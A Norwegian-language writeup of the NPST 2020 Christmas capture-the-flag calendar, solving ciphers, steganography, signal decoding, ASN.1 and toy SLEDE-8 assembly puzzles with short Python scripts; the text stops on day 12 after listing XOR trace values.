# NPST 2020 Writeup

## 1. Desember

```
Hei,

Kan du bekrefte at du har fått tilgang til systemet? Det gjør du ved å svare på denne meldingen med verifiseringskoden RUV{JgkJqPåGtFgvLwnKilgp}.

OBS: Jeg mistet verifiseringskoden din i salaten, så mulig du må rette opp i den før du svarer.

Vennlig hilsen din nærmeste leder
```

Oppgaveteksten hinter til Caesar-chiffer. Enkleste måten å løse denne på er å gå på en side som Crpytii og bla igjennom ROT-stillingen til man får flagget. Alternativt kan man løse den med litt python:

```py
# funksjon som skifter alle bokstaver i input med 1 (A -> B, B -> C, osv.)
def rot1(n):
    # variabel for sluttresultat
    res = ""
    # løkker over alle bokstaver i chiffertekst
    for i in n:
        c = ord(i)
        # I ASCII-enkoding, så er kodene 65-90 og 96-122 bokstaver (store og små respektivt)
        if (c>64 and c<90) or (c>96 and c<122):
            res += chr(c+1)
        # for bokstaven Z vil vi gå tilbake til A, så vi trekker fra 25 istedet for å legge til 1
        elif c==90 or c==122:
            res += chr(c-25)
        # hvis tegnet ikke er en bostav-legger vi det bare till sluttresultatet uten å endre noe
        else:
            res+=i
    return res
# funksjon for å dekryptere, "n" er teksten vi vil dekryptere,
# "crib" er deler av teksten vi allerede vet
def rot(n, crib):
    # denne while-løkken sjekker om n inneholder crib, hvis ikke skiftes alle bokstavene med 1
    # på denne måten kan vi raskt dekryptere teksten uten å måtte gjette oss fram
    while not crib in n:
        n = rot1(n)
    return n
        
# vi vet at flagget starter med "PST", så nå trenger vi bare å bruke funksjonen til å finne hvor mange
# bokstaver i alfabetet vi må skifte chifferteksten med
print(rot("RUV{JgkJqPåGtFgvLwnKilgp}","PST"))
```

Uansett fremgansmåte finner man snart ut at det er et ROT-24 chiffer (bokstavene skiftes 24 bortover alfabetet, kommer man til enden fortsetter man fra starten). Flagget er `PST{HeiHoNåErDetJulIgjen}`

### Egg #1

Igjennom denne CTF-en kom en del ekstra-oppgaver i form av egg. Noen a disse eggene var skjulte, mens noen av de var ekstraoppgaver til luker. Den første var gjemt et sted på nettsidensiden i en fil som kan bli funnet som en generisk fil på nettsider. En slik typisk fil er `robots.txt`, og brukes av søkemotorer til å navigere nettsider. En annen slik fil er `humans.txt`, og inneholder gjerne kontaktinformasjon, ros, og ære til utvilkerne av nettsiden. Går man på `https://dass.npst.no/humans.txt` får man:

```
/* TEAM */
	Site: https://github.com/PSTNorge
	Twitter: @twitt3rhai

/* SITE */
	Components: AWS lambda, nodejs, svelte
```

Om man skroller ned et par hundre linjer får man egget `EGG{sh4rks_d0t_txt}`

## 2. Desember

```
Etteretningsoffiseren GWYN, Pen ble stoppet i tollen ved utreise den 25. november. Vi sikret i den forbindelse et lagringsmidie som inneholdt en mystisk fil. Kan du analysere filen pen_gwyn_greatest_hits.mid?

Det er fortsatt uvisst hvorfor GWYN befant seg på Nordpolen på dette tidspunktet, men han skal ha blitt observert på det lokale vannhullet Svalbar.
```

Her blir vi gitt en zip-fil `beslag.zip`, som inneholder `pen_gwyn_greatest_hits.mid` og `privat.7z`, sistnente er en kryptert 7-Zip fil som kom til bruk senere i CTF-en. I denne oppgaven må vi analysere MIDI-filen for å finne flagget. En MIDI-fil (fil som ender på .mid), er en form for digital musikknotasjon. Men hører man på denne MIDI-filen, får man ikke mye til musikk.

Første jeg liker å gjøre når jeg får en fil jeg ikke skjønner noe av, er å ta en titt på innholdet i en hex-editor:

![hexdump.png](https://raw.githubusercontent.com/williamsolem/NPST-2020-Writeup/master/NPST%202020%20Writetup/Oppgaver/2.%20Desember/hexdump.png)

Her virker det som det er et mønster. En kjede med bokstaver med fire tegn i mellom seg. Bokstavene virker til å repiteres to ganger før neste bokstav kommer. Nederst virker det som det er starten på et flagg. Vi kan skjekke ved å skrive en et python-skript som henter ut bokstavene i mellom "P" og "}" og se om vi får et flagg:

```py
# Les innholdet i filen
file = open("pen_gwyn_greatest_hits.mid","rb").read()
# Finn starten på flagget
flag_start = file.index(b"P")
# Finn slutten på flagget
flag_end = file.index(b"}")
# Hvert unike tegn Ligger 10 tegn unna hvertandre
interval = 10
# Print flagget
print(file[flag_start:flag_end+interval:interval].decode())
```

Ut får vi: `PQRSPST{BabyPenGwynDuhDuhDuhDuhDuhDuh}`. Ok, det var en P ekstra i filen, men ellers fikk vi det vi lette etter

Flagget er `PST{BabyPenGwynDuhDuhDuhDuhDuhDuh}` i tilfelle du ikke fikk det med deg.


## 3. Desember

### Luke 3

```
Din kollega Tastefinger har identifisert noe 🧁 med fila cupcake.png fra beslaget du arbeidet med i går. Det er SANNSYNLIG at det kan være informasjon i bildet som ikke er synlig med det blotte øye. Gleder meg til å høre hva du kommer frem til!
```

Vi ble tilsendt denne meldigen fra Tastefinger dagen før oppgaven slapp:

```
Jeg gjettet passordet til zip-fila,, og det funket!

Sendt fra min PDA.
```

Minuttet før oppgaven slapp fikk vi denne meldigen:

```
Hvis forrige melding var noe uklar så er altså passordet "til zip-fila,"
```

Om vi prøver å åpne `privat.7z` ved bruk av passordet `til zip-fila,` åpnes arkivet. Vi har nå nå to nye filer: `cupcake.png` og `kladd.txt`, igjen kommer sistnevnte til bruk senere i CTF-en. La oss nå ta en titt på `cupcake.png`:

![cupcake.png](https://raw.githubusercontent.com/williamsolem/NPST-2020-Writeup/master/NPST%202020%20Writetup/Oppgaver/3.%20Desember/cupcake.png)

Første jeg gjør i en steganografi-oppgave er å sjekke fildataen med verktøy som Stegsolve og ExifTool. I dette tilfellet ble det ved bruk av stegsolve tydelig at det var noe gjemt i LSB (Least Significant Bits) til fila. Man kan bruke et vertøy som [denne](https://stylesuxx.github.io/steganography/) til å lese LSB-data i fila. Alternativt kan man også bruke zsteg.

Når man dekoder LSB-dataen får man denne youtube-lenken `youtu.be/I_8ZH1Ggjk0`, som er en scene fra CSI hvor de bruker den klassiske klisjéen ofte brukt i krim- og action-filmer om å forbedre bilder, noe som egentlig ikke er mulig i virkeligheten.

Men i dette tilfellet er bildet et tydelig hint, for i denne CTF-en er vi gitt et verktøy som kan "forbedre" visse bilder.

![enhance.png](https://raw.githubusercontent.com/williamsolem/NPST-2020-Writeup/master/NPST%202020%20Writetup/Oppgaver/3.%20Desember/enhance.png)
![enhance2.png](https://raw.githubusercontent.com/williamsolem/NPST-2020-Writeup/master/NPST%202020%20Writetup/Oppgaver/3.%20Desember/enhance2.png)

Måten den egentlig gjør dette på er ved å ta MD5-summen av fila og sjekker om det er en bildefil på serveren ved det navnet. Forbedrer vi `cupcake.png` får vi:

![9bab0c0ce96dd35b67aea468624852fb.png](https://raw.githubusercontent.com/williamsolem/NPST-2020-Writeup/master/NPST%202020%20Writetup/Oppgaver/3.%20Desember/9bab0c0ce96dd35b67aea468624852fb.png)

Her er altså flagget `PST{HuskMeteren}`

### Egg #3

Men det stopper ikke der, for bildefilen vi nettopp fikk ved å forbedre bildet inneholder noe mer. Om vi bruker de samme verktøyene som vi gjorde på `cupcake.png` på `9bab0c0ce96dd35b67aea468624852fb.png`, ser vi at et egg gjemmer seg i LSBen til filen: `EGG{MeasureOnceCutTwice}`

## 4. Desember

```
Hei,

Som alle vet, så varer jula helt til påske, og her starter problemene...

Vi i mellomledergruppa har begynt på et forprosjekt for utredning av bemanningsstrategi for påsken i årene fremover. Systemet vi benytter for å finne ut når det er påske oppfører seg rart, slik at dette viktige arbeidet nå har blitt satt på vent. Klarer du å finne ut hva som er feil?

Vi i mellomledergruppa er svært interessert i måltall, og ledelsen ønsker en rapport snarest på summen av kolonnen Maaltall fra og med 2020 til og med 2040. Kan du svare meg med denne summen, omkranset av PST{ og } når du finner ut av det?
```

Vi blir i denne oppgaven gitt filen `filer.zip`, som inneholder diverse SQL-filer og en CSV-fil. CSV-fila virker helt på jorde når det kommer til å kalkulere datoer til påskeaften. Jeg er personlig ikke mega-fan av SQL, så jeg bestemte meg for å oversette noe av SQL-koden til python og løse oppgaven på den måten. Jeg startet med filen `dbo.FunctionPaaskeAften.sql`, siden den inneholdt det mest interresante, som var måten Maaltall blir kalkulert på. Etter litt research fant jeg ut at når en dato konverteres til tall i SQL tar den antall dager mellom 1. januar 1899 og datoen, så med det begynte jeg å kode:

```py
import math
from datetime import date

# definerer en klasse Date for å holde kontroll på datoen
class Date:
    def __init__(self,d,m,y):
        self.d = d
        self.m = m
        self.y = y
        pass
    def dateAdd(self,v,a):
        if v=="d":
            self.d+= a
        elif v=="m":
            self.m+=a
        elif v=="y":
            self.y+=a
    def __repr__(self):
        return str(self.d)+"/"+str(self.m)+"/"+str(self.y)
    def toInt(self):
    	# brukte datetime til å kalkulere antall dager
        s = date(1899,1,1)
        d = date(self.y,self.m,self.d)
        
        return (d-s).days

# dbo.FunctionPaaskeAften.sql konvertert til python
def FunctionPaaskeAften(aar):
    a = aar%19
    b = math.floor(aar/100)
    c = aar%100
    d = math.floor(b/4)
    e = b%4
    f = math.floor((8+b)/25)
    g = math.floor((1+b-f)/3)
    h = (19*a+b-d-g+15)%30
    i = math.floor(c/4)
    k = aar%4
    l = (32+2*e+2*i-h-k)%7
    m = math.floor((a+11*h+22*l)/451)
    easterday = Date(1,1,2000)
    easterday.dateAdd("y",aar-2000)
    easterday.dateAdd("m",math.floor((h+l-7*m+114)/31)-1)
    easterday.dateAdd("d",(h+l-7*m+114)%31)

    return easterday

# printer summen av Maaltallene fra påskeaften 2020 til og med påskeaften 2040, omringet av PST{.*}
print("PST{",sum([FunctionPaaskeAften(i).toInt()-366 for i in range(2020,2041)]),"}",sep="")
```

Kjører man koden får man `PST{999159}`, som er flagget.

## 5. Desember

```
Det rapporteres om tilgangstrøbbel til dokumentasjonsvelvet. Vi har fått logger fra Seksjon for passord og forebygging i perioden der man mistenker at feilen kan ligge. Finner dere noe 🧁 i loggene?
```

I denne oppgaven blir vi gitt en log-fil `log.csv`, som inneholder datoer, personer, meldinger og mange flagg. Filen er URL-enkodet, så jeg bestemte meg for å URL-dekode den før noe annet (se `log_formatted.csv`). Etter det bestemte jeg meg for å lage et skript som filterer ut alle meldigene som kommer fra noen som allerede har sendt en meldig, slik får vi øye på alle de som har sendt melding.

```py
file = open("log_formatted.csv","rb").read().decode()

senders = {}

for i in file.split("\n")[:-1]:
    f = i.split(";")
    if f[1] in senders.keys():
        senders[f[1]] = ""
    else:
        senders[f[1]] = i
for j in senders.keys():
    if senders[j]!="":
        print(senders[j])
```

Output:
```
2020-10-15 08:35:03;Ni.ssen <Jule Nissen>;SPF <Seksjon for Passord og Forebygging>;I dag har jeg lyst til at PST{879502f267ce7b9913c1d1cf0acaf045} skal være passordet mitt
```

Hmmm, det ser ut til å være NISSEN, men det er et punktum mellom i-en og s-en. Her er det ugler i mosen, eller muligens en annen fugl. Riktignok, er flagget `PST{879502f267ce7b9913c1d1cf0acaf045}`

### Egg #4

```

Det er fortsatt mulig å svare på årets medarbeiderundersøkelse. Skryt meg gjerne opp i skyene, slik at jeg fremstår som en god mellomleder! Det gjør ved å sende meg en melding til HR med teksten EGG{w0rlds_b3st_b0ss}.

Besvarelser belønnes med stjerne i margen!

--- original melding ---

Hei Mellomleder,

Som du sikkert er klar over gjennomfører vi for tiden medarbeiderundersøkelser. På bakgrunn av resultatene så langt ønsker vi å kalle deg inn til en bekymringssamtale 07.12, klokken 13:24.

Møt presist.

--
HR

```

Her får vi et egg gratis, `EGG{w0rlds_b3st_b0ss}`

## 6. Desember

```
Det er på tide at dere begynner med e-læringen i SLEDE-8. Dette er arvtageren til SLEDE-4, og benyttes flittig av våre utviklere.

Fint hvis du rapporterer tilbake med verifikasjonskoden når du har løst e-læringsmodulen med kode 4032996b1bbb67f6. Utviklerverktøyet finner du her (slede8.npst.no).

Se forøvrig vedlagt dokumentasjon.
```

Og det er i denne luken vi blir introdusert til assembly-språket SLEDE-8, som skulle prege mye av årets kalender, og sende samtlige alvebetjente på leting etter ny mus på januar-salget.

Skriver vi inn e-læringsmodulen i slede8.npst.no får vi følgene oppgavetekst:

```
; Første byte med føde er et tall N som representerer
; antallet påfølgende bytes med føde.
; Beregn summen av de N påfølgende tallene,
; og gi resultatet som oppgulp.

; Lykke til!
```

Etter litt lesing av dokumentasjon og tekning kom jeg frem til denne løsningen:

```
LES r2 ; Skriv første byte med input til registeret r2
SETT r3, 0 ; Sett registeret r3 til 0, vi skal bruke dette registeret til å summere tallene
SETT r5, 1 ; Sett registeret r5 til 1, vi skal bruke dette registeret til å trekke fra r2 for hver byte
SETT r6, 0 ; r6 bli satt til 0 for å holde øye med når vi har lest all føden. (prøver vi å lese mer føde enn vi er gitt kresjer programmet)

loop:
LES r4 ; Skriv byte med minne til registeret r4
PLUSS r3, r4 ; Legg byte med minne til r3
MINUS r2, r5 ; Trekk 1 fra r2
ULIK r2, r6 ; Sjekk om r2 IKKE er null, hvis ja, fortsett loopen
BHOPP loop
SKRIV r3 ; Skriv resultatet
STOPP ; Stopp programmet
```

Sender vi inn koden til å bli testet på server blir vi gitt flagget: `PST{ATastyByteOfSled}`

### Egg #2

Om du husker `kladd.txt`, går alt nå opp. Det er jo SLEDE-8 kode! Laster vi inn fila får vi følgende:

```
SETT r1, 0x1
VSKIFT r1, r1
SETT r0, 69
SKRIV r0
HOPP 0x2e

hmm:
.DATA 0x44,0x65,0xee,0x87,0xb6,0x80,0xd1,0x4e,0xa,0x4a,0xdf,0x9f
.DATA 0xa0,0x5d,0x72,0xa2,0x83,0x9e,0x95,0xe5,0xd0,0xd6,0xaa,0x92
.DATA 0x7e,0xfc,0xb3,0x3b,0xbf,0x51,0xeb,0xae,0xed,0x82,0x1c,0x24

PLUSS r0, r1
SKRIV r0
SKRIV r0
SETT r0, 0x7b
SKRIV r0
TUR sydpolen
PLUSS r0, r1
SKRIV r0

STOPP

sydpolen:
SETT r14, r0
SETT r15, r1

FINN hmm
XELLER r2, r2
SETT r5, 0x1

omkved:
LES r3
LAST r4
XELLER r3, r4

LIK r2, r3
BHOPP postludium
SKRIV r3
PLUSS r0, r5
HOPP omkved

postludium:
SETT r0, r14
SETT r1, r15
RETUR
```

I tillegg er det fylt inn føde: `1729abc3f3b894366b27aff3c51b1dd0d0cec6b199b8def70c92d257ea228ee183ee6524`

Kjører vi koden får vi `EGG{SLEDE8ExampleForSPSTInternalUseOnly}`, som er egget.

### Egg #5

Om man tok seg litt tid til å grave rundt i det lekre nye verktøyet vi alvebetjenter ble nettopp kjent med, finner man kanskje flere e-læringsmoduler. En av disse er å skrive et Hello-World program:

```
; Skriv ut strengen "Hello, World!\n"

; Tips: 
; - Du kan velge om oppgulp skal vise ASCII- eller hex-verdier
; - Det enkle er ofte det beste

; Lykke til!
```

Det er flere måter å håndtere denne oppgaven på. Man kan være lat å bare laste inn hver bokstav linje for linje og printe dem ut, eller så kan man ta bruk av `DATA`-funksjonen i SLEDE-8:

```
SETT r3, 1 ; Vi representerer tallet 1 med registeret r3
SETT r4, 0xa ; 0xa er ASCII-verdien for linjeskift, vi kan bruke dette til å sjekke når linjen stopper
FINN dat ; Setter r0, som brukes som peker i minnet til SLEDE8, til dataen under dat-merkelappen

loop:
; laster og skriver data som oppgulp
LAST r2
SKRIV r2
; legger 1 til r0, så den peker på neste verdi i minnet
PLUSS r0, r3
; sjekker om vi har lastet linjeskift. Hvis ja, stoppes programmet, ellers fortsetter vi å skrive
ULIK r2, r4
BHOPP loop
STOPP

dat:
.DATA 0x48,0x65,0x6c,0x6c,0x6f,0x2c,0x20,0x57,0x6f,0x72,0x6c,0x64,0x21,0x0a
```


Sender vi inn koden får vi egget: `EGG{Hello, SLEDE8!}`


## 7. Desember

```
Det har blitt fanget opp et rart signal her på julenissens verksted. Det ser ikke ut til at det er et kontinuerlig signal, da det ser til å komme og gå litt. Klarer du å finne ut hva det er?
```

I denne oppgaven blir vi gitt fila `data.complex16u`. Jeg hadde med det første ingen anelse om hva denne fila var uten om at det var et slags signal. Tar man en titt på fila i en hex-editor får man først mange `0x7F`- og `0x80`-verdier. Første tanke var at det var sampling av et signal hvor hver byte var verdien på bølgefunksjonen i det tids-steget. Og ved å plotte en graf av filen virker dette til å stemme:

```py
import matplotlib.pyplot as plt

file = open("data.complex16u","rb")
data = [i for i in file.read()]

plt.plot(data)
plt.show()
```

![graph.png](https://raw.githubusercontent.com/williamsolem/NPST-2020-Writeup/master/NPST%202020%20Writetup/Oppgaver/7.%20Desember/graph.png)

Dette ser ut som noe binært, så jeg lagde et skript i forsøk på lese signalet. Første ting som måtte gjøres var å demodulere signalet, essensiellt bli kvitt bølgene slikt at vi bare har en sekvens med 1'ere og 0'er.

```py

file = open("data.complex16u","rb").read()

threshold = 0x81
group = 9

# Demoduler signalet
demodulated = []
for i in range(0,len(file),group):
    if max(file[i:i+group]) > threshold:
        demodulated.append(1)
    else:
        demodulated.append(0)


# Beregn lengden på hver bit i signalet
start_counting = False
counter = 0
for i in range(len(demodulated)):
    if demodulated[i] == 1:
        start_counting = True
    if start_counting:
        counter += 1
        if demodulated[i] == 0:
            break

# Konverter det binære signalet til ASCII og print ut
binary = "".join([str(i) for i in demodulated[::counter]])
for i in range(binary.index("1"),len(binary),8):
    b = int(binary[i:i+8],2)
    if b == 0:
        continue
    print(chr(b), end="")
```

Skriptet printer ut `PST{0n_0ff_k3y1ng_1s_34szBû`, ser ut som vi har en god del av flagget. Etter å ha googlet filformatet fant jeg [Universal Radio Hacker](https://github.com/jopohl/urh), et program som lot meg gjøre akkurat det jeg ville uten problem. Laster vi inn fila i programmet og setter "Show as" til "ASCII" ser vi at det fulle flagget er `PST{0n_0ff_k3y1ng_1s_34sy!}`

![urh.png](https://raw.githubusercontent.com/williamsolem/NPST-2020-Writeup/master/NPST%202020%20Writetup/Oppgaver/7.%20Desember/urh.png)

## 8. Desember

```
Det er viktig med faglig utvikling, også nå i førjulsstria. Dagens tema er ASN.1. Her er litt hjernetrim fra Nissens Kompetansebank™.

MIIBOTCCATAwggEnMIIBHjCCARUwggEMMIIBAzCB+zCB8zCB6zCB4zCB2zCB0zCByzCBwzCBuzCBszCBqzCBozCBnDCBlDCBjDCBhDB9MHYwbzBoMGEwWjBTMEwwRTA+MDcwMTAqMCMwHDAVMA4wBwUAoQMCAROgAwIBA6EDAgEMogMCAQChAwIBE6ADAgEBoQMCARKkAgUAoQMCARShAwIBDqIDAgEYoQMCAQShAwIBEqEDAgEOoQMCAQ6hAwIBB6IDAgECogMCAQigAwIBAaIDAgENogMCARKiAwIBAKMCBQCiAwIBE6IDAgESogMCAQ+hAwIBEaEDAgEOoQMCAQugAwIBAKIDAgEDoQMCAQyhAwIBFKEDAgESoQMCAQ+gAwIBAaEDAgEMoAMCAQOhAwIBEaEDAgEOogMCAQs=

Spec DEFINITIONS ::= BEGIN
    LinkedList ::= Node
    Node ::= SEQUENCE {
        child CHOICE {
            node Node,
            end NULL
        },
        value CHOICE {
            digit                [0] INTEGER(0..9),
            lowercase           [1] INTEGER(1..26),
            uppercase           [2] INTEGER(1..26),
            leftCurlyBracket    [3] NULL,
            rightCurlyBracket   [4] NULL
        }
    }
END

Lykke til!
```

Jeg var lite sofistikert på denne, Googlet bare "asn.1 decoder", klikket på første resultatet, limte inn base64-koden og trykket "decode". Etter det var det bare å lime inn resultatet i en python-skript og skrive ut output basert på spesifikasjonene gitt:

```py

code = ""

"""
Starter med en flere hundre-linjers string, se solve.py i "8. Desember"-mappen for hele skriptet
"""

res = ""
alphabet="abcdefghijklmnopqrstuvwxyz"
digit = "0123456789"
for i in range(0,len(code),2):
    if "[0]" in code[i]:
        res+=digit[int(code[i+1].split(" ")[2])]
    if "[1]" in code[i]:
        res+=alphabet[int(code[i+1].split(" ")[2])]
    if "[2]" in code[i]:
        res+=alphabet[int(code[i+1].split(" ")[2])].upper()
    if "[3]" in code[i]:
        res+="{"
    if "[4]" in code[i]:
        res+="}"
print(res[::-1])

```

Output:

`Lor3m1psumD0lorPST{ASN1IChooseYou}s1tAm3`, flagget er `PST{ASN1IChooseYou}`


## 9. Desember

```
En samarbeidende tjeneste har sendt oss en chatlogg fra en antatt SPST agent. Meldingen vekket oppsikt pga den overdrevne bruken av emojier. Meldingen ser ut til å være obfuskert på en eller annen måte som ikke er kjent for oss fra tidligere beslag.

Vi lurer på om det kan være brukt HEXMAS-enkoding. Kan du undersøke det nærmere?

🎅🤶❄⛄🎄🎁🕯🌟✨🔥🥣🎶🎆👼🦌🛷

🤶🛷✨🎶🎅✨🎅🎅🛷🤶🎄🔥🎆🦌🎁🛷🎅❄🛷🛷🎅🎶🎅✨🎅🦌🥣🔥🛷🦌⛄🎅🌟🛷🛷🔥🎄🦌🎅✨🦌🦌🕯🎶🎅🤶🦌❄🎁🕯🎅✨🎶👼🌟🎆🕯🌟❄👼🎅🎅🤶❄🎄👼🎆🔥🎁🛷🤶👼🎅🎅🎅🎅🎅🎅

```

Første linje virker til å ha 16 unike emojier; "HEXMAS" fikk meg til å tenke at det var hex bare at sifferne var byttet ut med emojis. Jeg skrev et skript som erstattet emojiene i andre linjen med hex-siffer:

```py
dic = {"🎅":"0",
"🤶":"1",
"❄":"2",
"⛄":"3",
"🎄":"4",
"🎁":"5",
"🕯":"6",
"🌟":"7",
"✨":"8",
"🔥":"9",
"🥣":"a",
"🎶":"b",
"🎆":"c",
"👼":"d",
"🦌":"e",
"🛷":"f"
}

ct = "🤶🛷✨🎶🎅✨🎅🎅🛷🤶🎄🔥🎆🦌🎁🛷🎅❄🛷🛷🎅🎶🎅✨🎅🦌🥣🔥🛷🦌⛄🎅🌟🛷🛷🔥🎄🦌🎅✨🦌🦌🕯🎶🎅🤶🦌❄🎁🕯🎅✨🎶👼🌟🎆🕯🌟❄👼🎅🎅🤶❄🎄👼🎆🔥🎁🛷🤶👼🎅🎅🎅🎅🎅🎅"

for i in ct:
    print(dic[i],end="")
```

Får output `1f8b0800f149ce5f02ff0b080ea9fe307ff94e08ee6b01e25608bd7c672d00124dc95f1d000000`, som jeg med en gang hiver i [CyberChef](https://gchq.github.io/CyberChef/), tryllestaven dukker opp og dekoder fra gunzip, får ut `PST{🧹🧹🎄🎅🎄🧹}`, som er flagget.

### Egg #6

![mal.png](https://raw.githubusercontent.com/williamsolem/NPST-2020-Writeup/master/NPST%202020%20Writetup/Oppgaver/Egg%206/mal.png)

De som logget inn på DASS ettermiddagen 9. desember ble presantert med en tjenestepakkeinstallasjon. Etter at tjenestepakken hadde blitt installert ville man bli introdusert til et nytt programm på DASS, Mal. Dette programmet kunne brukes til å tegne bilder og sette dem som skrivebordsbakgrunn på DASS. Om man så åpner Mal og trykker `Hjelp -> Åpne Mal 3D (x86)` vil man bli presantert med en feilmelding: 

![error.png](https://raw.githubusercontent.com/williamsolem/NPST-2020-Writeup/master/NPST%202020%20Writetup/Oppgaver/Egg%206/error.png)

La oss ta en titt på den assembly-koden:

```
inc ebp
inc edi
inc edi
jnp $+0x7a
cmp [esi],dh
pop edi
insd
popad
arpl [eax+0x69],bp
outsb
inc ebp
pop edi
arpl [edi+0x64],bp
inc ebp
jb $+0x7f
```

Om vi assembler dette til maskin-kode får vi `4547477B7838365F6D616368696E455F636F6445727D`, som er hex for `EGG{x86_machinE_codEr}`, som er egget.


## 10. Desember

```
Håper du er klar for nye utfordringer i SLEDE8.

Fint hvis du rapporterer tilbake med verifikasjonskoden når du har løst e-læringsmodulen med kode 82ec70284b51eb12. Utviklerverktøyet finner du fortsatt her.

Dokumentasjonen finner du også samme sted som tidligere, eller på GitHub (https://github.com/pstnorge/slede8).
```

Taster vi inn e-læringsmodulen i SLEDE-8 får vi følgende

```
; Føde består av to tall, A og B
; Skriv ut resultatet av (A + B) mod 256 som en ASCII-streng

; Eksempel: A=0xA0 og B=0x08 => '168'
; Eksempel: A=0xFF og B=0xFF => '254'
```

Vi skal med andre ord summere to tall sammen, konvertere resultatet til Base10, og skrive ut resultatet på skjermen. Heldingvis for meg hadde jeg en liten [SLEDE-8 compiler](https://github.com/williamsolem/slede8/tree/main/s8script_compiler) på lur som compilerer et enkelt skripting-språk til SLEDE-8. Koden til compileren er ikke særlig pen, og jeg har planer med å omskrive den til en skikkelig C-compiler i fremtiden når jeg får tid. Uansett, skrev jeg en løsning ved bruk av compileren:

```
int i = $input + $input;
int hcount = 48;
int hundre = 0;
int ti = 0;
int en = 0;

if i >= 100 {
    while i - 100 >= hundre {
        hundre += 100;
        hcount += 1;
    }

    print hcount;

    hcount -= hcount;
    hcount += 48;
    i -= hundre;

    if i < 10 {
        print hcount;
    }
}

if i >= 10 {
    while i >= ti {
        ti += 10;
        hcount += 1;
    }

    ti -= 10;
    hcount -=1;

    print hcount;

    i -= ti;
}
if i != 0 {
    while i > en {
        en += 1;
    }
}
print en + 48;
```

Minnet er 8-bits, så vi får mod 256 på kjøpet når vi legger sammen tallene. Kompilerer man koden får man SLEDE-8 kode på nesten 200 linjer (ligger i mappen), men som gir oss flagget: `PST{++AndKissesWillBeAwardedToYou}`.

### Egg #7

```
Godt jobbet!

Å mestre SLEDE8 kan bli avgjørende i denne førjulstiden! Hvis du synes denne var lett kan du prøve deg på e-læringsmodulen med kode 8e7c9876c85e5471.
```

Taster vi inn e-læringsmodulen i SLEDE-8 får vi følgende

```
; Føde består av to tall, A og B
; Skriv ut resultatet av A + B som en ASCII-streng

; Eksempel: A=0xA0 og B=0x08 => '168'
; Eksempel: A=0xFF og B=0xFF => '510'
```

En observasjon man kan danne seg her er at 510 er the høyeste tallet vårt program må kunne regne ut, i og med at hver byte ikke kan ha en høyere verdi enn 255 (255 + 255 = 510). Hvilket betyr at vi trenger bare å holde kontroll på ener, tier, og hundrer-plassene i tellene, legge dem sammen, å bære over til neste plass hvis et siffer overstiger 9. Denne løste jeg også ved bruk av compiler, og den kompilerte koden ble over 300 linjer, så du får sjekke mappa om du er interessert i å se koden.

Sender vi inn koden får vi egget `EGG{ba92ae3a9af1a157703ca83d9a9fb11d}`

## 11. Desember

```
Det interne sikkerhetsteamet hos NPST har oppdaget at det har skjedd en uautorisert modifikasjon på Nissens liste over snille og slemme barn. De påstår at en md5-sum har blitt endret på, men de trenger din hjelp til å finne ut nøyaktig hvilken. Vedlagt ligger en sikkerhetskopi med nissens liste fra det tidspunktet sikkerhetsteamet mener modifikasjonen har oppstått.
```

Vi blir gitt en zip-fil `liste.zip`, som inneholder filene `liste.db`, `liste.db-shm`, og `liste.db-wal`. Førstnevnte filen er en database, som er et greit sted å starte. Jeg googlet etter et verktøy jeg kunne bruke til å lese filen, og kom over [DB Browser for SQLite](https://sqlitebrowser.org/). Listen inneholder to tabeller; "snille" og "slemme". Hver består av tre kolonner "fornavn", "etternavn", og "md5". Jeg fant fort ut at md5 i hver rad var md5-hashen til fornavnet og etternavnet slått sammen uten mellomrom. Jeg fant også ut at jeg kunne eksportere tabellene som json-filer, noe som gjorde det enkelt å lage et python-skript for å sjekke md5-hashene:

```py
import json
import hashlib
  

# les filen (utf-8 enkoding tillater bruk av æøå)
f = open('snille.json',encoding="utf-8",)

# leser data som json
data = json.load(f) 

# itererer igjennom radene
for i in data:
    m = hashlib.md5()
    # henter fornavn
    fornavn = i["fornavn"]
    # henter etternavn
    etternavn = i["etternavn"]
    # tar md5-sum av fornavn og etternavn
    m.update(fornavn.encode()+etternavn.encode())
    # få ut som hex
    h = m.hexdigest()
    # sjekk om md5 matcher den i fila
    if h!=i["md5"]:
        # hvis ikke, print ut
        print(fornavn,etternavn,h,i["md5"])

f.close() 
```

output:

```
Agnes Brekke 6c8ecf5aa21f3b889030d8ede036cfe3 49422712408d5409a3e40945204314e6
```

Siste md5 er den i databasen, det viser seg å være riktig flagg `PST{49422712408d5409a3e40945204314e6}`

## 12. Desember

```
Det rapporteres at SydpolarSikkerhetstjeneste (SPST) i starten av desember hadde publisert s8asm-kode fra sin GitHub-bruker. Dette ble raskt fjernet, men din kollega Tastefinger rakk å sikre kildekoden.

Vi stiller oss spørrende til hvordan de har fått tak i spesifikasjonen til dette språket. HR følger opp hvem som har sluttet ila det siste året, og hvorvidt noen av disse kan ha delt denne informasjonen til SPST.

I mellomtiden har jeg jobbet iherdig med å montere koden. Klarer du å forstå hva SPST vil med dette? Jeg ser frem til verdifull input fra deg!

Se vedlagt fil for den monterte koden. Tastefinger mente det var relevant å fortelle at du kan finne nyttige verktøy her (https://github.com/PSTNorge/slede8).
```

Vi blir gitt fila `program.s8`, som er en SLEDE-8 binærfil. Ved første øyekast var jeg usikker på fremgangsmåte, men etter litt tenkning bestemte jeg meg for å porte [runtime.ts](https://github.com/PSTNorge/slede8/blob/main/src/runtime.ts) fra PSTs github til Python. På den måten hadde jeg en enkel måte å debugge fila på. Det ble tydelig under debuggingen av fila at den tar inn et passord, og antagelig gjør en XOR-operasjon med et innebygd passord for å sjekke om de matcher. Vi kan lekke passordetved å gjøre slik at den printer hva den XOR-er mens den kjører. kjør vi det får vi disse tallene:

```
0 ^ 1, 1 ^ 81, 0 ^ 2, 2 ^ 81, 0 ^ 3, 3 ^ 87, 0 ^ 5, 5 ^ 126, 0 ^ 8, 8 ^ 110, 0 ^ 13, 13 ^ 100, 0 ^ 21, 21 ^ 119, 0 ^ 34, 34 ^ 18, 0 ^ 55, 55 ^ 89, 0 ^ 89, 89 ^ 56, 0 ^ 144, 144 ^ 243, 0 ^ 233, 233 ^ 138, 0 ^ 121, 121 ^ 72, 0 ^ 98, 98 ^ 61, 0 ^ 219, 219 ^ 235, 0 ^ 61, 61 ^ 83, 0 ^ 24, 24 ^ 125, 0 ^ 85, 85 ^ 33, 0 ^ 109, 109 ^ 92, 0 ^ 194, 194 ^ 175, 0 ^ 47, 47 ^ 28, 0 ^ 241, 241 ^ 174, 0 ^ 32, 32 ^ 80, 0 ^ 17, 17 ^ 37, 0 ^ 49, 49 ^ 85, 0 ^ 66, 66 ^ 63
```

